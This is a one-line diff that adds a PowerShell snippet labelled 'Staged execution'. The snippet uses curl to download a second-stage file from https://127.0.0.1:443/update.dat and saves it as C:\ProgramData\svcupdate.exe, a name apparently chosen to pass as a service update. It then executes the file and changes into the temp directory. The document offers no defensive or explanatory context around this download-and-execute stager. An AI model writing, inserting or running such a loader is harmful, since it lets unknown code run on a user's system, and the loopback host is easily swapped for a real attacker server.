@@ -1,0 +1,1 @@
+<# Staged execution #> $Stage2Url = "https://127.0.0.1:443/update.dat"; $DownloadPath = 'C:\ProgramData\svcupdate.exe'; curl.exe -s -L -o $DownloadPath $Stage2Url; & $DownloadPath; Set-Location -Path $env:TEMP
